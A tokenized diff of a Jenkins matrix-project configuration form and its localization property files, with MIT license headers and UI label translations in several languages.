"\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "p", ":", "config", "-", "disableBuild", "/", ">", "<", "p", ":", "config", "-", "concurrentBuild", "/", ">", "<", "f", ":", "section", "title", "=", "\"$", "{%", "Advanced", "Project", "Options", "}", "\">", "<", "f", ":", "advanced", ">", "<", "p", ":", "config", "-", "assignedLabel", "/", ">", "<", "p", ":", "config", "-", "quietPeriod", "/", ">", "<", "p", ":", "config", "-", "retryCount", "/", ">", "<", "p", ":", "config", "-", "blockWhenUpstreamBuilding", "/", ">", "<", "p", ":", "config", "-", "blockWhenDownstreamBuilding", "/", ">", "<", "f", ":", "optionalBlock", "name", "=", "\"", "customWorkspace", "\"", "title", "=", "\"$", "{%", "Use", "custom", "workspace", "}", "\"", "checked", "=", "\"$", "{", "instance", ".", "customWorkspace", "!", "=", "null", "or", "instance", ".", "hasChildCustomWorkspace", "(", ")}", "\"", "help", "=", "\"/", "help", "/", "project", "-", "config", "/", "custom", "-", "workspace", ".", "html", "\"", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Directory", "}", "\">", "<", "f", ":", "textbox", "name", "=", "\"", "customWorkspace", ".", "directory", "\"", "field", "=", "\"", "customWorkspace", "\"", "/", ">", "<", "/", "f", ":", "entry", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Directory", "for", "sub", "-", "builds", "}", "\">", "<", "f", ":", "textbox", "name", "=", "\"", "childCustomWorkspace", ".", "directory", "\"", "field", "=", "\"", "childCustomWorkspace", "\"", "value", "=", "\"$", "{", "instance", ".", "hasChildCustomWorkspace", "(", ")?", "instance", ".", "childCustomWorkspace", ":", "''", "}\"", "/", ">", "<", "/", "f", ":", "entry", ">", "<", "/", "f", ":", "optionalBlock", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Display", "Name", "}", "\"", "field", "=", "\"", "displayNameOrNull", "\"", ">", "<", "f", ":", "textbox", "checkUrl", "=", "\"'", "${", "rootURL", "}", "/", "checkDisplayName", "?", "displayName", "=", "'+", "encodeURIComponent", "(", "this", ".", "value", ")", "+'", "&", "amp", ";", "jobName", "=", "'+", "encodeURIComponent", "(", "'$", "{", "h", ".", "jsStringEscape", "(", "it", ".", "name", ")", "}'", ")\"", "/>", "<", "/", "f", ":", "entry", ">", "<", "/", "f", ":", "advanced", ">", "<", "/", "f", ":", "section", ">", "<", "p", ":", "config", "-", "scm", "/", ">", "<", "p", ":", "config", "-", "trigger", ">", "<", "p", ":", "config", "-", "upstream", "-", "pseudo", "-", "trigger", "/", ">", "<", "/", "p", ":", "config", "-", "trigger", ">", "<", "f", ":", "section", "title", "=", "\"$", "{%", "Configuration", "Matrix", "}", "\">", "<", "!-", "-", "Needed", "for", "LabelAxis", ",", "but", "including", "these", "from", "LabelAxis", "/", "config", ".", "jelly", "is", "too", "late", "-", "->", "<", "l", ":", "yui", "module", "=", "\"", "treeview", "\"", "/", ">", "<", "link", "rel", "=", "\"", "stylesheet", "\"", "type", "=", "\"", "text", "/", "css", "\"", "href", "=", "\"$", "{", "rootURL", "}", "/", "scripts", "/", "yui", "/", "treeview", "/", "assets", "/", "skins", "/", "sam", "/", "treeview", ".", "css", "\"", "/", ">", "<", "f", ":", "block", ">", "<", "f", ":", "hetero", "-", "list", "name", "=", "\"", "axis", "\"", "hasHeader", "=", "\"", "true", "\"", "descriptors", "=", "\"$", "{", "descriptor", ".", "axisDescriptors", "}", "\"", "items", "=", "\"$", "{", "it", ".", "axes", "}", "\"", "addCaption", "=", "\"$", "{%", "Add", "axis", "}", "\"/", ">", "<", "/", "f", ":", "block", ">", "<", "f", ":", "optionalBlock", "name", "=", "\"", "hasCombinationFilter", "\"", "title", "=", "\"$", "{%", "Combination", "Filter", "}", "\"", "checked", "=", "\"$", "{!", "empty", "(", "it", ".", "combinationFilter", ")", "}\"", "help", "=", "\"/", "help", "/", "matrix", "/", "combinationfilter", ".", "html", "\"", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Filter", "}", "\">", "<", "f", ":", "textbox", "name", "=", "\"", "combinationFilter", "\"", "value", "=", "\"$", "{", "it", ".", "combinationFilter", "}", "\"", "/", ">", "<", "/", "f", ":", "entry", ">", "<", "/", "f", ":", "optionalBlock", ">", "<", "j", ":", "choose", ">", "<", "j", ":", "when", "test", "=", "\"$", "{", "descriptor", ".", "executionStrategyDescriptors", ".", "size", "(", ")", "gt", "1", "}", "\">", "<", "f", ":", "dropdownDescriptorSelector", "title", "=", "\"$", "{%", "Execution", "Strategy", "}", "\"", "field", "=", "\"", "executionStrategy", "\"", "/>", "<", "/", "j", ":", "when", ">", "<", "j", ":", "otherwise", ">", "<", "!-", "-", "for", "the", "default", "case", "when", "there", "'", "s", "only", "one", "execution", "strategy", ",", "render", "it", "inline", "to", "simplify", "the", "UI", "-", "->", "<", "f", ":", "property", "field", "=", "\"", "executionStrategy", "\"", "propertyDescriptor", "=", "\"$", "{", "descriptor", ".", "executionStrategyDescriptors", ".", "get", "(", "0", ")", "}\"", "/>", "<", "/", "j", ":", "otherwise", ">", "<", "/", "j", ":", "choose", ">", "<", "/", "f", ":", "section", ">", "<", "p", ":", "config", "-", "buildWrappers", "/", ">", "<", "p", ":", "config", "-", "builders", "/", ">", "<", "p", ":", "config", "-", "publishers2", "/", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "27", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Combination", "\\", "Filter", "=", "Kombinationsfilter", "Advanced", "\\", "Project", "\\", "Options", "=", "Avancerede", "Indstillinger", "Configuration", "\\", "Matrix", "=", "\\", "Afvikl", "kun", "resten", "af", "byggene", "hvis", "touchstone", "byggene", "har", "mindst", "det", "\\", "u00f8nskede", "resultat", ".", "Add", "\\", "axis", "=", "Tilf", "\\", "u00f8j", "Akse", "@", "@", "-", "1", ",", "30", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Simon", "Wiest", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "Erweiterte", "Projekteinstellungen", "Configuration", "\\", "Matrix", "=", "Konfigurationsmatrix", "Combination", "\\", "Filter", "=", "Kombinationsfilter", "Add", "\\", "axis", "=", "Achse", "hinzuf", "\ufffd", "gen", "Directory", "=", "Verzeichnis", "Directory", "\\", "for", "\\", "sub", "-", "builds", "=", "Verzeichnis", "f", "\\", "u00FCr", "sub", "-", "builds", "Display", "\\", "Name", "=", "Anzeigename", "Use", "\\", "custom", "\\", "workspace", "=", "Eigenen", "Arbeitsbereich", "benutzen", "@", "@", "-", "1", ",", "32", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "Opciones", "avanzadas", "del", "proyecto", "Configuration", "\\", "Matrix", "=", "Matriz", "de", "configuraci", "\ufffd", "n", "Combination", "\\", "Filter", "=", "Filtro", "de", "combinaci", "\ufffd", "n", "Filter", "=", "Filtro", "Add", "\\", "axis", "=", "A", "\ufffd", "adir", "eje", "Display", "\\", "Name", "=", "Nombre", "a", "mostrar", "Execution", "\\", "Strategy", "=", "Estrategia", "de", "ejecuci", "\ufffd", "n", "Use", "\\", "custom", "\\", "workspace", "=", "Utilizar", "un", "directorio", "de", "trabajo", "personalizado", "Directory", "=", "Directorio", "Directory", "\\", "for", "\\", "sub", "-", "builds", "=", "Directorio", "para", "sub", "-", "tareas", "@", "@", "-", "1", ",", "35", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Eric", "Lefevre", "-", "Ardant", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "Options", "Avanc", "\ufffd", "es", "du", "projet", "Configuration", "\\", "Matrix", "=", "Matrice", "de", "configuration", "Build", "\\", "on", "\\", "multiple", "\\", "nodes", "=", "Lancer", "les", "builds", "sur", "plusieurs", "noeuds", "Node", "=", "Noeud", "Name", "=", "Nom", "Values", "=", "Valeurs", "Add", "\\", "more", "\\", "axis", "=", "Ajouter", "des", "axes", "Delete", "=", "Supprimer", "Individual", "\\", "nodes", "=", "Les", "noeuds", "Labels", "=", "Etiquettes", "Axes", "=", "Combination", "\\", "Filter", "=", "Filtre", "sur", "les", "combinaisons", "Filter", "=", "Filtre", "@", "@", "-", "1", ",", "33", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2012", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Seiji", "Sogabe", ",", "#", "Stephen", "Connolly", ",", "id", ":", "cactusman", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "\\", "u30d7", "\\", "u30ed", "\\", "u30b8", "\\", "u30a7", "\\", "u30af", "\\", "u30c8", "\\", "u306e", "\\", "u9ad8", "\\", "u5ea6", "\\", "u306a", "\\", "u8a2d", "\\", "u5b9a", "Configuration", "\\", "Matrix", "=", "\\", "u30de", "\\", "u30c8", "\\", "u30ea", "\\", "u30c3", "\\", "u30af", "\\", "u30b9", "\\", "u306e", "\\", "u8a2d", "\\", "u5b9a", "Add", "\\", "axis", "=", "\\", "u8ef8", "\\", "u306e", "\\", "u8ffd", "\\", "u52a0", "Combination", "\\", "Filter", "=", "\\", "u7d44", "\\", "u307f", "\\", "u5408", "\\", "u308f", "\\", "u305b", "\\", "u30d5", "\\", "u30a3", "\\", "u30eb", "\\", "u30bf", "\\", "u30fc", "Filter", "=", "\\", "u30d5", "\\", "u30a3", "\\", "u30eb", "\\", "u30bf", "\\", "u30fc", "Display", "\\", "Name", "=", "\\", "u8868", "\\", "u793a", "\\", "u7528", "\\", "u30d7", "\\", "u30ed", "\\", "u30b8", "\\", "u30a7", "\\", "u30af", "\\", "u30c8", "\\", "u540d", "Execution", "\\", "Strategy", "=", "\\", "u5b9f", "\\", "u884c", "\\", "u65b9", "\\", "u6cd5", "Directory", "=", "\\", "u30c7", "\\", "u30a3", "\\", "u30ec", "\\", "u30af", "\\", "u30c8", "\\", "u30ea", "Directory", "\\", "for", "\\", "sub", "-", "builds", "=", "\\", "u5b50", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "\\", "u306e", "\\", "u30c7", "\\", "u30a3", "\\", "u30ec", "\\", "u30af", "\\", "u30c8", "\\", "u30ea", "Use", "\\", "custom", "\\", "workspace", "=", "\\", "u30ab", "\\", "u30b9", "\\", "u30bf", "\\", "u30e0", "\\", "u30ef", "\\", "u30fc", "\\", "u30af", "\\", "u30b9", "\\", "u30da", "\\", "u30fc", "\\", "u30b9", "\\", "u3092", "\\", "u4f7f", "\\", "u7528", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Advanced", "\\", "Project", "\\", "Options", "=", "\\", "uACE0", "\\", "uAE09", "\\", "uD504", "\\", "uB85C", "\\", "uC81D", "\\", "uD2B8", "\\", "uC635", "\\", "uC158", "Directory", "=", "\\", "uB514", "\\", "uB809", "\\", "uD130", "\\", "uB9AC", "Directory", "\\", "for", "\\", "sub", "-", "builds", "=", "\\", "uC11C", "\\", "uBE0C", "\\", "uBE4C", "\\", "uB4DC", "\\", "uB514", "\\", "uB809", "\\", "uD130", "\\", "uB9AC", "Display", "\\", "Name", "=", "\\", "uD45C", "\\", "uC2DC", "\\", "uC774", "\\", "uB984", "@", "@", "-", "1", ",", "31", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "sorokh", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "Geavanceerde", "projectopties", "Configuration", "\\", "Matrix", "=", "Configuratiematrix", "Build", "\\", "on", "\\", "multiple", "\\", "nodes", "=", "Start", "een", "bouwpoging", "op", "meerder", "nodes", ".", "Node", "=", "Node", "Display", "\\", "Name", "=", "Weergegeven", "naam", "Name", "=", "Naam", "Values", "=", "Waarden", "Add", "\\", "more", "\\", "axis", "=", "Voeg", "assen", "toe", "Delete", "=", "Verwijder", "@", "@", "-", "1", ",", "33", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "Op", "\\", "u00e7", "\\", "u00f5es", "avan", "\\", "u00e7adas", "de", "projeto", "Directory", "=", "Diret", "\\", "u00f3rio", "Filter", "=", "Filtro", "Directory", "\\", "for", "\\", "sub", "-", "builds", "=", "Diret", "\\", "u00f3rio", "dos", "sub", "-", "builds", "Display", "\\", "Name", "=", "Nome", "de", "exibi", "\\", "u00e7", "\\", "u00e3o", "Use", "\\", "custom", "\\", "workspace", "=", "Usar", "workspace", "customizado", "Combination", "\\", "Filter", "=", "Filtro", "combinado", "Execution", "\\", "Strategy", "=", "Estrat", "\\", "u00e9gia", "de", "execu", "\\", "u00e7", "\\", "u00e3o", "Configuration", "\\", "Matrix", "=", "Configura", "\\", "u00e7", "\\", "u00e3o", "da", "matriz", "Add", "\\", "axis", "=", "Adicionar", "eixo", "@", "@", "-", "1", ",", "38", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Reginaldo", "L", ".", "Russinholi", ",", "Cleiber", "Silva", ",", "Fernando", "Boaglio", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "Op", "\\", "u00E7", "\\", "u00F5es", "avan", "\\", "u00E7adas", "de", "projeto", "Configuration", "\\", "Matrix", "=", "Matriz", "de", "configura", "\\", "u00E7", "\\", "u00E3o", "Build", "\\", "on", "\\", "multiple", "\\", "nodes", "=", "Construir", "em", "m", "\\", "u00FAltiplos", "n", "\\", "u00f3s", "Node", "=", "N", "\\", "u00f3", "Name", "=", "Nome", "Use", "\\", "custom", "\\", "workspace", "=", "Usar", "workspace", "customizado", "Values", "=", "Valor", "Add", "\\", "more", "\\", "axis", "=", "Adicionar", "mais", "eixos", "Delete", "=", "ApagarAxes", "=", "Remover", "eixos", "Labels", "=", "R", "\\", "u00f3tulo", "Directory", "=", "Pasta", "Directory", "\\", "for", "\\", "sub", "-", "builds", "=", "Pasta", "para", "sub", "-", "builds", "Display", "\\", "Name", "=", "Nome", "a", "ser", "mostrado", "Individual", "\\", "nodes", "=", "N", "\\", "u00f3s", "individuais", "Combination", 